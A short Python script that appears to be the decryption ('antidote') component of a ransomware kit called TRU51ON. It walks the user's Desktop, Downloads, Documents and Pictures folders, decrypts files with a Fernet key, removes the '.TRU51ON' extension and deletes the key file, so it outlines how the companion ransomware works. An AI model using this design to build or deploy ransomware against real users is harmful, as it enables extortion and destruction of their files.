# Import modules
import os
from cryptography.fernet import Fernet

# Get the paths for Desktop, Downloads, Documents and Pictures
userprofile = os.environ.get("USERPROFILE")
desktop = os.path.join(userprofile, "Desktop")
downloads = os.path.join(userprofile, "Downloads")
documents = os.path.join(userprofile, "Documents")
pictures = os.path.join(userprofile, "Pictures")

# List of directories to search
directories = [desktop, downloads, documents, pictures]

# List all files in the current directory except for TRU51ON.py and antidote.key
files = []
for directory in directories:
    for file in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, file)):
            if file == "TRU51ON.py" or file == 'antidote.key':
                continue
            else:
                files.append(os.path.join(directory, file))

print(files)

# Read the key
with open('antidote.key', 'rb') as antidote:
    key = antidote.read()

# Decrypt the files one by one
for file in files:
    try:
        with open(file, 'rb') as f:
            content = f.read()
        content_decrypted = Fernet(key).decrypt(content)
        with open(file, 'wb') as f:
            f.write(content_decrypted)
        os.rename(file, file.replace('.TRU51ON', ''))
    except:
        pass

# Remove the key
os.remove('antidote.key')